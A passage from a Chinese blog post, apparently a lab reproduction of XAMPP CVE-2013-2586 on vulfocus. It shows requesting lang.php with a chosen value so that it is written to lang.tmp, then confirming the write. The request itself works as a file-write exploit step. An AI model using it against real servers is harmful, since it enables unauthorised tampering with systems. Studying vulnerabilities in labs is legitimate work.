...
<table border="1" cellpadding="1" cellspacing="1"><tbody>|写入复现博文|目标|状态
|[【漏洞复现-xampp-文件写入】vulfocus/xampp-cve_2013_2586](https://blog.csdn.net/qq_53079406/article/details/127236384)|特殊函数的使用|已发布
|2023将继续更新，敬请期待|——|——
</tbody></table>
...
<h3>1.2、知识:</h3>
1、lang.tmp
位于C:/xampp/htdocs/xampp之下，第一次登陆首页的时候，选择了语言后会在这个文件下写数据，比如选择中文就是zh,英文就是en
2、WriteIntoLocalDisk
写入本地磁盘
...
> 
<h3>2.1、分析：</h3>
http://ip:port/xampp/lang.php?WriteIntoLocalDisk<img alt="" height="297" src="https://img-blog.csdnimg.cn/35637ae217194aa6a7c4e0327a742d3a.png" width="1200"/>
访问http://ip:port/xampp/lang.tmp
回显WriteIntoLocalDisk
说明写入成功
 <img alt="" height="253" src="https://img-blog.csdnimg.cn/38194b370113454f8bd0b9c171c0e7b7.png" width="827"/>


 回到http://ip:port/xampp/splash.php
点击中文进入
